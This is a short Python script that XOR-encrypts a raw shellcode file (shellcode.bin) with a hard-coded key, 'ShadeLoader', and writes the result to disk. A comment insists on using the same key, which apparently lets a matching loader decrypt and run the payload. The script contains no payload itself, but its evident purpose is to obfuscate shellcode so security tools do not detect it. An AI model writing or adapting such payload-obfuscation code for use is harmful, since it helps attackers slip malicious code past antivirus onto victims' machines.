def xor_encrypt(data, key):
    key_len = len(key)
    return bytearray((data[i] ^ key[i % key_len]) for i in range(len(data)))

# Read shellcode
with open('shellcode.bin', 'rb') as f:
    shellcode = f.read()

# USE THE SAME KEY !!!!!
key = b"ShadeLoader"

encrypted_shellcode = xor_encrypt(shellcode, key)

with open('encrypted_shellcode.bin', 'wb') as f:
    f.write(encrypted_shellcode)
